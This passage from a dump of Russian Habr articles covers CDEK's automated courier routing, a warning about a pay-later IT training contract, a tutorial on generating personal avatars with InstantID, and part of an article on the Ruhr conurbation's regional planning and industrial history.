веке.Автоматизированная — функции системы обеспечиваются миксом действий системы и человека. Мы находимся здесь.Автоматическая — без участия человека. Мы хотим быть здесь.Чтобы объяснить, что такое автоматическое распределение в нашем случае, давайте сначала расскажу, как сейчас выглядит маршрутизация автоматизированная.Как сейчас? Автоматизированная система управления маршрутамиCDEK, не для кого не секрет — логистическая компания. Мы принимаем посылку в точке А и везём в точку В. Дальше (по желанию клиента) курьером доставляем её до двери. Процесс доставки от последнего склада до двери клиента называется доставкой на последней миле. Последняя миля — это про то, как курьеру доставить посылку вовремя, несмотря на влияние внешних факторов. Пробки, погодные условия и прочее, что не всегда входит в сферу нашего влияния. Это важно, потому что все мы не любим ждать свой заказ из интернет‑магазина целый день.Зона курьерской доставки разбита на «макрозоны». По одной макрозоне катается один курьер.Зона городской доставки разбита на постоянные полигоны, которые мы называем «макрозонами». В каждой из них за доставку заказов и выполнение заявки отвечает один курьер. Клиент говорит свой адрес, мы вычисляем его координаты и распределяем заказ в нужную макрозону. Когда фура приходит на склад, все заказы собраны в огромные паллеты. Их разбирают кладовщики, и заказ отправляется на полку, закрепленную за конкретной макрозоной. Приходит курьер, загружает посылки с полки в машину и выходит на маршрут. А вот дальше — внимание! Курьер открывает приложение и изучает: что, куда и когда он должен доставить. Там есть:Простые заказы: без временных интервалов, можно доставить в любой момент дня.Заказы, которые нужно доставить в определенный временной интервал (клиент согласовал: «Доставьте мне с 13:00 до 15:00»).В течение дня курьеру также могут прилетать заявки. Когда это происходит, ему необходимо приехать по адресу и забрать посылку для последующей отправки через CDEK. Заявки тоже бывают срочными.Курьер взывает к своим чертогам разума и начинает составлять последовательность: куда и когда он поедет. Да, наши курьеры — неплохие математики, которые умеют решать в уме задачу многокритериальной оптимизации. В реальности человеческая голова не приспособлена для решения задач с таким количеством критериев. Какой бы умный и эрудированный не был человек, решать такие задачи эффективно на постоянной основе невозможно.Курьеры старались «скучковать» заказы. И если человека не было на месте, они начинали предлагать ему, чтобы заказ приняла жена/сестра/мама. Иногда появлялись предложения подъехать на работу/в поликлинику — в общем в любую точку, где находился клиент. Ходит легенда, что однажды примерка дорогой шубы проходила в лесополосе, потому что клиент предложил там «пересечься» (но главное, что заказ был доставлен вовремя). ДиагностикаПервый этап — сбор требований от бизнеса. Эта задача затрагивает большое число разных стейкхолдеров. Есть курьеры, есть бригадиры курьеров, есть менеджмент, есть собственники бизнеса. Все хотят, как им кажется, разного. КурьерБригадир курьераМенеджментСобственники бизнесаКлиентУвеличение зарплатыПрозрачность работы курьераПрозрачность работы доставкиПрозрачность работы доставкиСвоевременная доставка посылкиСнятие нагрузки по планированию маршрутаАвтоматическое распределение грузов по маршрутам, а не вручнуюОптимальность использования людских и транспортных ресурсовОптимальность использования людских и транспортных ресурсовТочное попадание в короткий интервалСчитает, что сам лучше знает, куда и когда вести грузМинимум коммуникацийПомимо этих непростых коммуникаций нас ждали новые задачи: наблюдения за работой складов (обязательно в нескольких городах);поездки вместе с курьерами на выдачу посылок;встречи с бригадирами, начальниками доставок складов, региональными менеджерами;и даже полноценный event storming. В итоге мы выявили такую выгоду для бизнеса и пользу для клиентов и сотрудников CDEK:одна из ключевых выгод — снижение стоимости доставки минимум на 10%; маршрутизация поможет оптимально планировать нагрузку курьеров, чтобы мы их не перегружали и не требовали невозможного; благодаря этому у нас будет информация, где именно находится курьер;технология позволит увеличить попадание в интервалы доставки: раз клиент сказал, что будет ждать с 13:00 до 15:00, надо и везти ему с 13:00 до 15:00, а не как курьеру удобно.ДиагнозОсновное заболеваниеНаши бизнес‑процессы были настроены так, чтобы как можно быстрее привезти посылки пользователям. Мы называем это принципом «выдачи с колес» — груз должен проводить в обработке на складке как можно меньше времени и сразу передаваться на доставку.Например, у нас много направлений, на которых фуры с грузом приходят рано утром того дня, когда клиент получит заказ. Есть максимум пара часов, чтобы обработать груз на складе, распределить по курьерам и отправить последних развозить посылки. Но часть груза приходит на склад накануне вечером, и его логично обработать раньше, до наступления утра.Для компьютерного алгоритма оптимизации был бы удобен такой сценарий: груз копится на складе и только когда дойдет весь на конкретную дату, запускается маршрутизатор. Он формирует маршруты, и после этого мы начинаем складскую обработку.Тут вы могли бы мне возразить: «Вам же не обязательно держать все посылки в одном месте. Вы же знаете, когда придет фура? Вот и выберите время, когда она приедет по расписанию. Вы же клиентам как‑то сообщаете, что их заказ придёт в определённый день. Не по кофейной гуще же вы гадаете?»Конечно, мы видим груз в системе с момента, когда принимаем его у клиента. Да, на это, очевидно, надо завязываться. Но есть нюансы. Во‑первых, нам нужно предсказывать объем работы за несколько суток, помните? Но у нас есть супер короткие магистрали — например, Барнаул‑Новосибирск. Расстояние между ними 250 км. Груз из фуры Новосибирск‑Барнаул живет в системе очень недолго (часов двенадцать), а предсказать, сколько курьеров должно работать в конкретный день, нам нужно за неделю.Во‑вторых, вопрос предсказания, когда посылка доберётся до конечного склада, откуда её заберёт курьер и когда отвезёт клиенту — очень непростой. Мы умеем фиксировать факт прохождения грузом промежуточных стадий. Например, когда груз из Владивостока в Москву перемещается из фуры в фуру в специальных точках — Новосибирске и Екатеринбурге. Сейчас же вовсю кипит работа, чтобы неприятности (вроде задержки фуры на 3 часа под Хабаровском из‑за проколотого колеса) были видны в системе сразу и имели влияние на прогнозное время. ОсложнениеРазница работы складов. У каждого нашего склада процессы корректируются под себя. Приведу примеры, чтобы было понятно, как это происходит. Например, на какой‑то склад может приходить много груза с утра. Какой‑то склад может получать груз равномерно, но зависеть от задержек авиасообщения. И вот от этих разнящихся обстоятельств могут отличаться и вводные. Кому‑то комфортно, если наших маршрутов придется подождать пару часов, кому‑то — нет. У кого‑то груз равномерно появляется в системе, а у кого‑то случаются «всплески» — пять дней строили, например, 10 маршрутов, а потом самолет в Магадан взял и задержался на сутки. И все его посылки нужно доставлять уже в следующую дату. То есть нужно разработать довольно гибкий алгоритм, который можно настраивать, учитывая процессы каждого конкретного склада.ЛечениеМы разделили задачу по разработке и внедрению маршрутизации на два больших этапа: предпланирование и прохождение курьером маршрута.ПредпланированиеСтроим маршруты за несколько дней до момента, когда курьер загрузит посылки к себе в машину и начнет колесить по городу. На этом этапе нам нужно понять, сколько курьеров понадобится в день Х. Также желательно посмотреть, как распределяются заказы: где на карте загрузка будет выше, а где — ниже. Конкретные адреса и посылки сейчас не особо важны. И да, как уже говорилось выше, многие из них еще даже не принесли в CDEK. Это задача прогнозирования.С недавних пор случилось позитивное изменение: мы научились оперативно фиксировать время прихода‑отъезда‑задержки фур, перевозящих посылки по маршруту.Задача прогнозирования также делится на две части: это прогноз нагрузки на склад по статистическим данным и прогноз того, когда же реальные посылки, которые уже где‑то в фуре в пути, доедут до конечного склада. В основу нашей концепции легла идея постепенной замены статистического, предсказанного груза теми посылками, которые появляются в системе.На первом планировании маршрута (за 5 суток до смены) с помощью ML делаем прогноз: сколько и примерно куда будут сделаны заказы. Для этого на основе статистики вычисляем количество заказов и рисуем карту плотности. Дальше разбиваем эту карту на сетку и в каждой ячейке размещаем определенное количество «фиктивных» адресов. Это позволяет разделить на маршруты карту на первой итерации.Постепенно в системе появляются реальные заказы, которые мы будем доставлять в дату смены, на которую строим прогноз. То есть люди приходят в пункты выдачи СDEK'а или оформляют доставку в интернет‑магазинах, эти заказы упаковываются в фуры и едут по своим логистическим цепочкам, развозя грузы на конкретные склады. Как только заказ попал в систему, она рассчитывает, когда он должен прибыть в конечную точку. Этот заказ заменяет собой один из предсказанных, фиктивных заказов. Так постепенно прогнозные заказы будут заменяться заказами, которые уже есть в системе. Но! И это важно — эти заказы тоже прогнозные! Пока посылка не дошла до конечного склада, мы не можем со 100% уверенностью утверждать, что она не придет на день раньше или на день позже. Поэтому всё это время строим маршруты с так называемым «полным перестроением» — каждый раз по‑новому делим территорию на маршруты и по необходимости меняем количество курьеров. Дальше наступает час Х, когда первые посылки приходят на конечный склад. Нам нужно «зафиксировать» маршруты: финально определиться с их количеством и больше эту цифру уже не менять. Почему именно в этот момент? Потому что посылки, уже дошедшие до склада, мы должны «прибить гвоздями» к какому‑то маршруту и положить их на полку для этого маршрута. С этой полки их и заберёт курьер. Если начнём раз в час перекладывать посылки с полки на полку — устроим такой хаос, что конкуренту не пожелаешь! Итак, мы фиксируем маршруты и уже окончательно ставим на маршрут заказы, добравшиеся до конечного склада. Тут наступает час Y — ночью перед сменой пора очистить маршруты от всех прогнозных, «фиктивных» заказов, если они ещё остались. И в этом состоянии мы отдаём наши маршруты на второй этап — прохождение маршрута.Прохождение маршрутаКурьер пришёл на работу, погрузил заказы в машину, открыл мобильное приложение и готов ехать. Что нужно на этом этапе? Уметь перестраивать маршрут из‑за изменившейся обстановки. Триггерами пересчета служат:факт выполнения заказа;перенос времени или места выдачи заказа;поступление заявки.ВыводЧто мы поняли после теста? Проверку делали в Омске. Потому что склад CDEK в Омске средних размеров, его руководство интересуется проектом и готово терпеть неудобства :)За рамками теста осталась ситуация, когда на склад резко и неожиданно пришло больше посылок, чем обычно. По идее, этот груз мы должны увидеть в системе до того, как он придёт на склад. И как такового скачка случиться не должно. Но с другой стороны, такие всплески плохо прогнозируются через статистику.Экономит ли это себестоимость — пока непонятно. Прозрачность работы курьера безусловно повышается.Главное — порядок выполнения заказов. Второстепенное — это как ехать по дорогам. С ремаркой, что это касается опытных курьеров. Если курьер новенький или заменяет отпускника, то ценность маршрута в формате «как проехать» резко повышается.Когда маршрут сразу в приложении у курьера, а не где‑то на стороне — это действительно очень важно. В одну из прошлых попыток внедрения автомаршрутизации мы пробовали делать MVP с отображением маршрутов отдельно от приложения курьера. Сделали вывод, что это была одна из причин неудачи. Сейчас мы это подтвердили.Не нужно менять последовательность заказов у ближайших точек. Это очень сбивает курьера. Кластер из 3–5 ближайших точек должен оставаться нетронутым. Конечно, если не случилось отмены доставки на сегодня или переноса интервала.Хронические проблемы — повод попробовать экспериментальные методы лечения. Без ML-прогноза мы бы не смогли (опять) решить первую часть задачи маршрутизации курьеров — предварительное планирование нагрузки на курьеров и разбиение по маршрутам. Зову в комментарии поделиться историями, как в ваших задачах помогло машинное обучение. Что еще почитать по теме?Яндекс.Маршрутизация: как мы окунулись в логистику и решили поменять будущееКак мы переучивали алгоритм построения маршрутов 2ГИС ради грузовиковУ нас были курьеры, десятки посылок и час на доставку: кейс со своевременностью доставки 92% в МосквеКак мы с друзьями собрали сервис для построения маршрутов для походов и велопутешествий ActiveTrip.me",2024-01-26
"Учись сейчас, плати потом 2 года",30,1,https://habr.com/ru/articles/789122/,"Чуть больше месяца назад в нашего бота для обратной связи написал человек, который собирался сменить профессию на айтишную. Он поделился с нами интересным договором на обучение на ручного тестировщика, который ему предложили подписать в «Ката Академии». В договоре удалены персональные данные, но всё остальное оставлено как есть. В этой истории с обучением интересно следующее:1. Компания «Ката Академия» была создана в мае 2022 года. За полгода оборот составил 0 рублей. На момент публикации нет финансовых данных за 2023 год. Компания участвует в проекте «Сколково».2. Договор, который предложили подписать, заключался не с образовательной организацией «Ката Академия», а с ИП Севостьянов. Этот предприниматель — учредитель и генеральный директор «Ката Академия».3. У ИП Севостьянов на момент публикации нет лицензии на осуществление образовательной деятельности. Поэтому был предложен не договор об обучении, а договор об оказании услуг. Кто будет обучать оказывать услуги, с какой квалификацией и с какими гарантиями — неясно.4. Подписывая этот договор, «обучаемый» соглашается отчислять «Ката Академии» 17% своего дохода на протяжении 2-х лет после трудоустройства. Сюда относится не только зарплата, но и выплаты по больничному листу, премии, отпускные и пособия по беременности и родам, а также пособие по уходу за ребенком до полутора лет.5. «Обучаемый» может в одностороннем порядке отказаться от договора в первые 35 дней обучения, выплатив 20 000 рублей. Если сделать это позднее, то придётся выплатить штраф в размере 300 000 рублей.6. Обучение оказание услуг длится 3 месяца. Ещё 1 месяц выделяется на подготовку к собеседованию и 2 месяца на поиск работы. Вопрос о том, возможно ли в такие короткие сроки получить достаточную квалификацию, оставим открытым.Вместо вывода банальная, но важная рекомендация — перед подписанием договоров внимательно их читайте. Также не забывайте проверять организации, с которыми планируете заключать договор.Объединяйтесь.",2024-01-26
InstantID: Создание персонализированных изображений по одному фото. И лучший бесплатный генератор нейро-аватарок,30,2,https://habr.com/ru/articles/789028/,"Друзья, всем привет, вышла в свет новая удивительная технология, на гите она подписана как InstantID : Zero-shot Identity-Preserving Generation in Seconds. Но по факту это самый крутой генератор аватарок в мире, который по одной лишь вашей фотографии может создать персонализированное изображение с вашим лицом в любом стиле по текстовому запросу используя SDXL модели Stable Diffusion. Так что к концу этой статьи, у вас так же как и у меня будет десяток новых аватарок и совершенно бесплатно.И так, что же такое InstantID? по сути это эволюция идеи IP-Adapter-FaceID, который в свою очередь был развитием идеи базового IP-Adapter.И в этом месте аудитория обычно разделяется на две части, одни думают: что ты вообще несешь и что тут происходит? А другие: АВАТАРКИ ДАВАЙ!!!11. Если вы относитесь к первым и вам интересно как это все работает, читайте отсюда, а если ко вторым, то прыгайте на пару абзацев вниз к заголовку ГЕНЕРИРУЕМ АВАТАРКИ!!1.Что у вас здесь происходит?Речь в этом материале идет про дополнение к генерирующий изображения по текстовому запросу нейросети Stable Diffusion. Это дополнение ControlNet и служит для того, чтобы задавать строгие рамки для генерации, подробнее про ControlNet я рассказывал в прошлой статье про ControlNet Animal OpenPose, который позволяет скопировать позу с животного и повторить её при следующей генерации. Для этого в ControlNet есть препроцессор, он создает карту на основе изображения, и есть пред обученная модель, которые знает как на основе этой карты влиять на генерацию в Stable Diffusion, например задавать контур или позу.Птичка-синтетичкаЗдесь же речь идет про задачу переноса не просто контура или позы, а всего лица на генерируемое изображение для персонализации. При том так, чтобы оно было узнаваемым даже при художественной стилизации, в виде портрета маслом или в стиле аниме.  Схематические изображенный процесс обучения моделиРаньше для этого приходилось делать сложные процедуры, обучение моделей или лор, что занимало время, требовало особых знаний, подготовить и разметить дата-сет с собственными лицом. Но ControlNet сделал возможным так называемый Zero-shot подход, работу по одному лишь фото, без дополнительного обучения. О новейшем решении, которое позволяет генерировать персонализированные изображения сегодня и пойдет речь.InstantID (ImagePrompt-Adapter-FaceID-Plus-InsightFace-Swapper)ImagePrompt-Adapter-FaceID-Plus-InsightFace-Swapper: Мог бы называться InstantID, потому что по сути наследует из перечисленных технологий что-то. При этом достигая синергии всех технологий.Я уже рассказывал про FaceSwap в Fooocus, который работает мягко говоря хреново, делая кого-то лишь примерно похожего на вас. Знаем мы и про модели InsightFace которые используются в закрытом нынче roop, и вышедшем ему на замену ReActor и различных дипфейках, как FaceFusion, которые созданы для того, чтобы заменять одно лицо на другое, как это делать я рассказывал в статье Стань героем мемов! Делаем гифки со своим лицом с помощью нейросетей. И работают они в целом великолепно, хорошо натягивая геометрию лица на любое изображение.Но из-за того, что это постобработка, т.е. замена лица происходит уже после создания изображения, невозможно создать действительно художественный образ. Накладываем лицо на изображение созданное в стиле Аниме. Получается что-то вот такое.Совсем не тортВот вроде бы похоже, лицо вставилось ок, но мы видим, что стиль тут совсем не тот же, который был у этого изображения. Результат был бы лучше, если бы мое лицо встраивалось еще на этапе генерации, на уровне шума, раньше это было возможно только если бы мы обучили на своем лице лору (мини-модель) или полноценную модель.  Ноу-хау же метода InstantID состоит в том, чтобы добавить информацию о лице на этапе генерации через модель antelopev2 из семейства InsightFace, того самого который использовался для дипфейков и в знаменитом roop. Но тут эта модель служит для того, чтобы получить векторное представление лица, эмбединг и на этапе генерации подсунуть это представление в Stable Diffusion через Image Prompt Adapter, чтобы генерился не рандомный 1man или 1girl, а именно вы. Ну чтож, с теорией закончили, время делать АВАТАРКИ!!11  Вот теперь тортГЕНЕРИРУЕМ АВАТАРКИ!!1Мы будем использовать онлайн демо InstantID на huggingface, это совершенно бесплатно, правда оно может быть перегружено и квота на попытки у вас не безлимитная, но в этих ситуациях просто зайдите позднее.Так же вы можете использовать Google Colab, просто запустите обе ячейки по очереди и дождитесь появления ссылки.На странице мы видим максимально простой интерфейс, в первое окошко загружаем вашу фотографию с лицом, я использую фото плохого качества сделанное с вебки, кстати фото с вебки можно сделать тут же кликнув на иконку. Если будете использовать качественное (не большое, а именно качественное) фото, то и результат будет лучше.Во второе окошко вы можете загрузить изображение - референс, с которого будет взята поза и экспрессия. Я например возьму изображение с сайта PromptHero, он кажется не открывается без VPN.a single muscular man made of Fire and melting ice in space, detailed face, narrow nose, neon, plasma, red and blue, intricate details, hyperrealistic, 4k, symmetric, volumetric lighting, (Masterpiece:1. 5), (best quality:1. 5), (natural skin texture, hyperrealism, soft light, muted colors), backgroundНиже идет поле ввода куда мы пишем запрос на английском языке, я просто вставляю запрос который нашел на PromptHero. Обратите внимание, что по умолчанию включен стиль Watercolor, превращая все в акварельку, стили тут прикольные, но без стилей еще лучше, так что я его выключаю. И так вот что получилось у меня.По моему вышло весьма круто, с учетом того, что мы использовали случайный вообще запрос. Судя по коду в этой демке используется модель YamerMIX_v8, просто поищем там какую-нибудь классную картинку и возьмем запрос оттуда, это даст нам еще более интересный результат.Мне понравилась вот такая картинка с девушкой в скафандре, было было бы круто сделать такую, же только со мной. Просто копируем запрос из поля Prompt и изменяем его, заменив female, на male.waist-up ""male Astronaut in a Jungle"" by Syd Mead, broken helmet tangerine cold color palette, muted colors, detailed, 8k,photo r3al,dripping paint,3d toon style,3d style, cyborg style, Movie StillИ вот такой результат получился у меня, не очень нравится шлем, но все равно очень очень круто! Особенно мне нравится как InstantID круто изменяет угол лица и оно все еще остается узнаваемым!Но ведь использовать второе изображение не обязательно, если вы запустите генерацию без референсного изображения, то композиция будет такая же, как на фото с вашим лицом. Вот пример по запросу выше, но уже без референса в виде девушки астронавта.  Т.е. правильно выбирая фотку под вашу художественную задумку вы можете влиять на генерацию, была б у меня тут на голове кастрюля, шлем получился бы лучше 😂  Или вот еще крутой пример девушка викинг, мы не девушка, но вполне себе хотим быть викингом, поменяем запрос:High quality, Very highly detailed, a muscle male barbarian, digital illustration, aesthetic beauty, perfect anatomy, perfect face, abstract beauty, beautiful, centered, looking at the camera, approaching perfection, dynamic, moonlight, highly detailed, digital painting, art station, concept art, smooth, sharp focus, illustration, art by Carne Griffiths and Wadim Kashin, awesome full colorПо моему отлично. Двигаемся дальше.А что если взять что-то более художественное, вот картинка с девочкой-оленем, претендующая на художественность, получится ли у меня сделать такое же изображение с собой?mythical fantasy creature living in the iridescent forest, a hybrid creature reindeer and male god, wonderful, stunningly beautiful, Jean Baptiste Monge, Carne Griffiths, Edward Hopper, Surrealism, Dark Art by James Jean, Takato Yamamoto, Carne Griffiths, Michael Garmash, Seb Mckinnon, complicated details, very detailed, multicolored, very detailed, hyperrealistic, 8k, best quality, masterpiece, elegance, fantastical, behance contest winner, featured on unsplash, Vector ArtВу-аля, картина Король Оленей, со мной в главной роли, по моему очень круто получилось. Не забудь пошутить про рога в комментарии.Разобрались с тем, где брать крутые запросы и референсы, теперь можно посмотреть и на встроенные стили. Я сделал сетку из всех стилей и генерировал по простому запросу Portrait of man, 35 y.o, blue-grey eyes.Стили интересные и могут пригодится не только, если лень придумывать свой сюжет, но и чтобы превратить какой-то уже готовый сюжет во что-то другое, например снова возьмем референс и запрос девочку с оленем, только на этот раз включим стиль Neon. Получился очень яркий и праздничный олень король оленей, хотя неона совсем не появилось. Смело комбинируйте стили с вашими промптами и интересными референсами. Попробуем пример с фактурой и сложной текстурой, нарисованная черно-белая девушка.  Немного меняем запрос:a drawing of a man, portrait, lookin at the camera, black and white, hints of oil painting style, hints of watercolor style, brush strokes, negative white space, captivating beauty, crisp, sharp, textured collage, layered fibers, post-impressionist, hyper-realismИ вот такой результат получился у меняЕще один классный пример, на этот раз с брызгами краски. Немного меняю запрос:Portrait of a man, splashed with vivid hues of paint across him, channelling the artistic styles of modern Europeans like Sandra Chevrier and Martin Ansin, rendered on a sprawling canvas, incorporating elements of ochre tones in the color scheme, thoughtful intricate detailing, enhanced by Nicolas Delort inspired imagery, indulging in ink painting qualities, presenting a perfect balance between realism and fantasy, the paint appearing to drip and meld on her face, reminiscent of a dynamic album coverИ вот такой результат получился у меня, по моему очень круто.Если покрутить ползунки IdentityNet strength (for fedility) и Image adapter strength (for detail), можно либо усилить первое фото, либо второе, с первого соответственно вы усилите свои черты внешности, а со второго позу и стиль из изображения референса. По умолчанию значения 0.8 достаточно.Ну и последний пример на сегодня, девушка робот на свалке.Cyberpunk,sci-fi,dark-fantasy,kodak portrait 400,8k,soft light,volumetric lighting,highly detailed,photo of a broken ruined cyborg man in a landfill + face, grey-blue eyes, body is broken with scares and holes,half the face is android,laying on the ground,missing legs,raining,night,intricate,elegant,highly detailed,2D motifs detailed dark fantasy digital painting,artstation,concept art,smooth,sharp focus,illustration,reflector light in backfront,dirty wt skin,holes on the body,art by Otomo Katsuhiro and ShirÅ Masamune and Oshii Mamoru,Вот что вышло у меня, по моему очень круто.Но это еще не конец, ведь вы можете улучшить полученное изображение через Fooocus, сделать апскейл, а потом еще и до инпеинтить некоторые части и довести изображение вот до такого уровня детализации.  Согласитесь, после доработки совсем другой уровень.Запускаем локальноЕсли вы гордый обладатель жирной современной видеокарты, желательно от 16гб видеопамяти и только Nvidia, то можете запустить локальную версию. Но ту версию которая указана на гите разработчиком как рабочая под Windows, мне не удалось развернуть, как я не пытался. Потому мы решили сделать свою портативную версию с моим товарищем Flutty Proger, если вдруг знаете его, передайте привет 😎. Портативка еще в разработке, скажу лишь что в ней будет поддержка LCM, чтобы сэкономить ресурсы и возможность указать домашнюю папку с моделями, чтобы на лету между ними переключаться.ComfyUIВ наличии есть два пайплайна для ComfyUI ZHO-ZHO-ZHO/ComfyUI-InstantID и huxiuhan/ComfyUI-InstantID. Если попробуете, то отпишитесь какой лучше работает, я в комфи не запускал.А на этом у меня все, вы познакомились с новой крутой технологией и теперь сможете бесплатно наделать себе и друзья кучу классных аватарок, вы знаете как это работает, где искать запросы и референсы. Скидывайте то что у вас получается в комментарии и в наш чатик нейро-операторов или заходите если что-то не получится.Я рассказываю больше про нейросети у себя на YouTube, в Телеграм и на Бусти, подпишитесь чтобы не пропустить выход портативной версии InstantID, которую мы с Flutty Proger в ближайшее время представим.",2024-01-26
Конурбация Рура: чем живёт бывшее индустриальное сердце Европы,27,1,https://habr.com/ru/companies/ruvds/articles/788746/,"Карта землепользования Рура из регионального плана развития. Видна сросшаяся городская ткань конурбации, плотная транспортная сеть и сохранившиеся очаги промышленности (серый цвет). Источник: RVR

Я долго откладывал материал по Руру на потом, для него нужно было созреть. Рурский бассейн, где до WWII добывалось половина угля и выплавлялось треть европейской стали, и который стал символом индустриальной мощи, за последние полвека сильно сдал. Но не сдался, пусть и прошёл через мучительную трансформацию. Мы приехали в Дортмунд в 2018 г. после учебного модуля в США. И, конечно, главным вопросом было, как региону после коллапса тяжёлой промышленности удалось избежать судьбы Детройта. Потрясло тогда особое отношение местных к ржавеющим остовам промышленных гигантов как к части истории, которую невозможно вычеркнуть. Два других принципиальных вопроса после США были: как агломерации удаётся заниматься развитием общей инфраструктуры (всегда и везде найдутся упёртые дядьки), и как удалось провернуть ревитализацию Рура, став центром экологических компетенций в пост-угольную эру. Но обо всём по порядку.

1. Регион Рейн-Рур
Рурштадт, или Ruhr Metropolis, состоит из более 50 сросшихся городов общим населением более 5,1 млн человек, крупнейшими из которых являются Дортмунд, Эссен, Дуйсбург и Бохум. Такой тип агломераций без ярко выраженного центрального ядра принято называть конурбацией. Быстрая индустриализация XIX в. и миграционный рост привели к хаотичному росту поселений вокруг угольных шахт и металлургических заводов, которые постепенно начали срастаться. В итоге сегодня Рурштадт — практически сплошная городская ткань протяжённостью около 116 на 67 км с общей коммунальной инфраструктурой и связанными система городского транспорта. Но это ещё не всё. Конурбация занимает северную часть т.н. Рейнско-Рурского региона (Rhine-Ruhr metropolitan region), он же Triple Metropolis. Он включает в себя 20 крупных городов с общим населением более 12 млн человек. Двумя другими его ядрами служит Дюссельдорф (столица федеральной земли Северный Рейн – Вестфалия или NRW) и местная «альфа» — миллионник Кёльн, постепенно срастающийся с Бонном, бывшей столицей ФРГ. Доля Triple Metropolis в ВВП Германии составляет 15%, а по численности населения он является четвёртым в Европе, после агломераций Лондона, Парижа и Москвы. 



Для того, чтобы исключить восстановление сильного централизованного государства, побеждённая Германия получила Конституцию 1949 г. с федеральными землями, обладающими значительной автономией в решении местных вопросов, включая территориальное планирование и самоуправление. Центр задаёт общефедеральные принципы и рамки, практическим содержанием наполняют которые уже региональные ассоциации территориального планирования. Тем не менее, фискальный федерализм развит и в Германии, он выражается в вертикальном финансовом выравнивании сильных и слабых федеральных земель путём бюджетных трансферов. Также значительна роль Берлина в финансировании работы муниципальных служб — на него приходится до половины их расходов (ещё треть на бюджет федеральных земель и лишь 17% на сами муниципалитеты). Но Германию и без конституции отличает сильная историческая традиция самоорганизации «на местах» (наследие позднего объединения лишь во второй половине XIX в). Она помогла сформировать в Рурштадте сразу несколько структур для координации развития в масштабах всей конурбации. Прежде всего, это Ассоциация регионального планирования Рура (Regional Planning Association Ruhr, RVR), образованная ещё в 1920 г. и ставшая вообще первым таким объединением в стране. Это также Ассоциация транспорта Рейн-Рур (Verkehrsverbund Rhein-Ruhr, VRR), которая обеспечивает интеграцию сетей городского транспорта и единую систему оплаты. И, наконец, это Emscher Association, уже более века объединяющая муниципалитеты бассейна реки Эмшер для решения общих вопросов водоснабжения и водоотведения.

Чуть подробнее стоит рассказать об Ассоциации RVR — это общественный выборный орган представителей 11 муниципалитетов Рура, а также важнейших социальных групп (бизнес, профсоюзы, спортивные, культурные и природоохранные ассоциации и прочее). Её работа финансируется из бюджета федеральной земли, а также входящих туда муниципалитетов. Полномочия RVR чрезвычайно широкие: от разработки региональных планов до финансирования масштабных инфраструктурных проектов, развития бизнеса и туризма. Для этого у Ассоциации есть отдельное агентство по экономическому развитию WMR, агентство по туризму RTG и оператор вывоза бытовых отходов AGR. RVR отвечает и за зелёную инфраструктуру, рекультивацию территории бывших промышленных площадок и угольных шахт. Фактически Ассоциация выступает земельным банком Рура, скупая высвобождающиеся площади. Далее она либо сохраняет их от дальнейшего развития, осуществляя проекты экологического восстановления бывших промышленных территорий (сегодня в собственности RVR находится 18 тыс. Га, две трети из которых занимают леса), либо реализует проекты редевелопмента, в т. ч. через реализацию интересных участков на коммерческом рынке. Успех ревитализации Рура в целом в рамках проекта IBA Emscher Park в 1990-е гг., а также скоординированного развития инфраструктуры городов конурбации в последнее время — во многом заслуга именно RVR. 



Всё бы ничего, но зоны ответственности координационных объединений Рурштадта частично перекрывают ещё несколько «тузов» масштаба уже всего Рейнско-Рурского региона. Это ассоциация Region CologneBonn по координации территориального планирования двух срастающихся городов, расположенных в 24 км друг от друга, а также Rhineland Regional Association — то же, но с включением туда ещё и Дюссельдорфа для развития бизнеса и привлечения инвестиций. Этакая звёздная тройка городов белых воротничков, никогда не знавшая едкости угольной пыли и жара мартеновских печей, но постоянно портящая кровь старопромышленной RVR. И в рамках этих ассоциаций также удалось достичь недурной координации усилий по конкретным проектам. К примеру, интеграция сетей городского транспорта, когда из Кёльна в Бонн можно добраться на городском трамвае, а обратно — на метротраме. Но координация планировочных усилий между центрами силы — Рурштадтом, Кёльном/Бонном и Дюссельдорфом — сведена к минимуму. Более того, они напрямую конкурируют друг с другом, яростно толкаясь локотками в Брюсселе за лучшие проекты и FDI. Как-то почивший недавно госсекретарь США Генри Киссинджер метко пошутил о Европе, что её главная слабость — в отсутствии единого международного телефонного кода (одно дело быть общим рынком, другое — единой страной с общими задачами). В полной мере, хотя и на более низком уровне, это относится и к Triple Metropolis.

2. Расцвет-упадок-расцвет?
▍ 2.1 Расцвет и упадок земли угля и стали 
Добыча угля в Руре велась ещё в средние века, но индустриальные масштабы приобрела с начала XVIII в. Промышленная революция, неутомимая деятельность Круппа, а также объединение Германии с опорой на милитаризм Пруссии предопределили судьбу региона. Первое в мире применение в 1830-х гг. паровых машин для откачки грунтовых вод с больших глубин в шахтах позволило достичь угольных пластов с отличной коксуемостью. Именно каменноугольный кокс, а также местная железная руда (потом из захваченной Лотарингии/зарубежья) стали основой быстрого развития металлургического комплекса Рура (выплавка чугуна и углеродистой стали, а затем и металлопрокат), коксохимии, энергетики и тяжёлого машиностроения. Регион стал быстро развиваться и урбанизироваться, его население в 1850-1925 гг. выросло практически в 10 раз — до 3,8 млн человек. 

Закономерно, что именно Рур стал центром военной промышленности нацисткой Германии, во время войны заводы Круппа в Эссене, фабрики по производству синтетического топлива и прочие стратегические объекты подвергались систематическим бомбардировкам союзной авиации. После капитуляции Германии именно международный контроль Рура стал гарантией от возрождения военной мощи. В 1946 г. из трёх разрозненных провинций набившей всем оскомину Пруссии в британской зоне оккупации была образована одна, — Северный Рейн-Вестфалия, охватившая весь бассейн Рура целиком. Для контроля добычи угля и производства стали в 1949 г. образовали Международный орган по Руру (IAR), который сохранил эту функцию и после учреждения ФРГ. Его функции перешли созданному в 1952 г. Европейскому объединению угля и стали (ECSC). Роберт Шуман, министр иностранных дел Франции и его идейный вдохновитель, стремился максимально интегрировать Германию в единый рынок и экономику Западной Европы, чтобы новая война стала просто невозможной. 



